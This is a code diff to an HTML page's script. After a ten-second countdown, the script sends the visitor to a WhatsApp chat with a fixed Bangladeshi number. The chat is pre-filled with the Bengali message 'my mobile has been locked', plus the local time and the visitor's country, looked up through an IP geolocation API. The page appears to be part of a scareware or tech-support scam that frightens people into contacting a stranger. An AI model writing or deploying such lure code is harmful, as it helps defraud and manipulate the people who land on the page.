@@ -176,24 +176,53 @@
     </div>
   </div>
 
- <script>
-  function toggleContent(id) {
-    const content = document.getElementById(id);
-    content.style.display = content.style.display === 'block' ? 'none' : 'block';
-  }
-
-  let timeLeft = 10;
-  const countdownEl = document.getElementById('countdown');
-
-  const timer = setInterval(function() {
-    timeLeft--;
-    countdownEl.textContent = timeLeft;
-    if (timeLeft <= 0) {
-      clearInterval(timer);
-      window.location.href = "https://wa.me/8801328673342?text=আমার%20মোবাইল%20লক%20হয়ে%20গেছে%0AID%20মডেল%20নাম্বার%3A%2090c10c";
+  <script>
+    function toggleContent(id) {
+      const content = document.getElementById(id);
+      content.style.display = content.style.display === 'block' ? 'none' : 'block';
     }
-  }, 1000);
-</script>
 
+    let timeLeft = 10;
+    const countdownEl = document.getElementById('countdown');
+
+    const timer = setInterval(() => {
+      timeLeft--;
+      countdownEl.textContent = timeLeft;
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+
+        // Get device info
+        const deviceInfo = navigator.userAgent;
+
+        // Get local time (Bangladesh)
+        const now = new Date();
+        const options = {
+          timeZone: 'Asia/Dhaka',
+          hour12: true,
+          hour: 'numeric',
+          minute: 'numeric',
+          second: 'numeric'
+        };
+        const localTime = new Intl.DateTimeFormat('bn-BD', options).format(now);
+
+        // Get country code via IP API
+        fetch("https://ipapi.co/json/")
+          .then(res => res.json())
+          .then(data => {
+            const country = data.country || 'unknown';
+
+            const message = `আমার মোবাইল লক হয়ে গেছে\nসময়: ${localTime}\n ${country}`;
+            const encodedMessage = encodeURIComponent(message);
+            window.location.href = `https://wa.me/8801328673342?text=${encodedMessage}`;
+          })
+          .catch(err => {
+            // fallback if API fails
+            const message = `আমার মোবাইল লক হয়ে গেছে\nসময়: ${localTime} \n unknown`;
+            const encodedMessage = encodeURIComponent(message);
+            window.location.href = `https://wa.me/8801328673342?text=${encodedMessage}`;
+          });
+      }
+    }, 1000);
+  </script>
 </body>
 </html>
